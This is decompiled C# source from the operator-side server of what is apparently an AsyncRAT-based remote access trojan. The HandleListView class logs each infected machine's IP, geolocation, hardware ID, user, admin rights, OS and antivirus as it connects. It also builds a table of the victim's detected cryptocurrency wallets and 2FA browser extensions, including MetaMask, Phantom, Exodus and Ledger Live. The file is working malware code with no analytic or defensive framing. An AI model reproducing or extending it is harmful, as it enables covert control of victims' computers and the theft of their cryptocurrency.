using System;
using System.Collections;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Handle_Packet
{
	// Token: 0x02000067 RID: 103
	public class HandleListView
	{
		// Token: 0x060002F1 RID: 753 RVA: 0x0001F870 File Offset: 0x0001DA70
		public void AddToListview(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				object lockBlocked = Settings.LockBlocked;
				lock (lockBlocked)
				{
					try
					{
						if (Settings.Blocked.Count > 0)
						{
							if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
							{
								client.Disconnected();
								return;
							}
							if (Settings.Blocked.Contains(client.Ip))
							{
								client.Disconnected();
								return;
							}
						}
					}
					catch
					{
					}
				}
				client.LV = new ListViewItem
				{
					Tag = client,
					Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(new char[]
					{
						':'
					})[1])
				};
				try
				{
					string[] array = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(new char[]
					{
						':'
					})[0]).Split(new char[]
					{
						':'
					});
					client.LV.SubItems.Add(array[1]);
					try
					{
						client.LV.ImageKey = array[2] + ".png";
					}
					catch
					{
					}
				}
				catch
				{
					client.LV.SubItems.Add("??");
				}
				string name = "";
				try
				{
					string path = HandleListView.NamePath + "\\_" + unpack_msgpack.ForcePathObject("HWID").AsString;
					if (File.Exists(path))
					{
						name = File.ReadAllText(path);
					}
					else
					{
						name = string.Format("Client_{0}", Interlocked.Increment(ref HandleListView._client_x));
					}
				}
				catch
				{
				}
				client.LV.SubItems.Add(name);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("LastTime").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Antivirus").AsString);
				client.LV.SubItems.Add("0000 MS");
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("BoolWallets").AsString);
				try
				{
					client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
				}
				catch
				{
					client.LV.SubItems.Add("...");
				}
				client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
				ListViewItem lv = client.LV;
				lv.ToolTipText = lv.ToolTipText + "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;
				client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
				client.LV.UseItemStyleForSubItems = false;
				Program.form1.Invoke(new MethodInvoker(delegate()
				{
					object lockListviewClients = Settings.LockListviewClients;
					lock (lockListviewClients)
					{
						Program.form1.listView1.Items.Add(client.LV);
						Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						Program.form1.lv_act.Width = 500;
					}
					try
					{
						if (Convert.ToBoolean(unpack_msgpack.ForcePathObject("BoolWallets").AsString))
						{
							bool flag3 = false;
							using (IEnumerator enumerator = Program.form1.listView5.Items.GetEnumerator())
							{
								while (enumerator.MoveNext())
								{
									if (((ListViewItem)enumerator.Current).SubItems[0].Text == unpack_msgpack.ForcePathObject("HWID").AsString)
									{
										flag3 = true;
										break;
									}
								}
							}
							if (!flag3)
							{
								ListViewItem listViewItem = Program.form1.listView5.Items.Add(unpack_msgpack.ForcePathObject("HWID").AsString, 0);
								listViewItem.SubItems.Add(name);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Meta_Firefox").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Meta_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Meta_Edge").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Meta_Brave").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Meta_Opera").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Meta_OperaGX").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Phantom_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Phantom_Brave").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Binance_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Binance_Edge").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("TronLinkChrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("BitKeep_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Coinbase_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Ronin_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Trust_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("BitPay_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("F2a_Chrome").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("F2a_Brave").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("F2a_Edge").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Rabby_Wallet").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Ledger_Live").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Atomic").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Exodus").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Electrum").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Coinomi").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Binance").AsString);
								listViewItem.SubItems.Add(unpack_msgpack.ForcePathObject("Bitcoin_Core").AsString);
								Program.form1.listView5.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							}
						}
					}
					catch
					{
					}
					if (Settings.Default.Notification)
					{
						Program.form1.notifyIcon1.BalloonTipText = "Connected \r\n" + client.Ip + " : " + client.TcpClient.LocalEndPoint.ToString().Split(new char[]
						{
							':'
						})[1];
						Program.form1.notifyIcon1.ShowBalloonTip(100);
					}
					new HandleLogs().Addmsg("Client " + client.Ip + " connected", Color.Green);
				}));
			}
			catch
			{
			}
		}

		// Token: 0x060002F2 RID: 754 RVA: 0x0001FDC8 File Offset: 0x0001DFC8
		public void Received(Clients client)
		{
			try
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (client.LV != null)
					{
						client.LV.ForeColor = Color.Empty;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000205 RID: 517
		private static string NamePath = Environment.ExpandEnvironmentVariables("%appdata%\\AsyncRAT\\clients\\name");

		// Token: 0x04000206 RID: 518
		private static volatile int _client_x;
	}
}
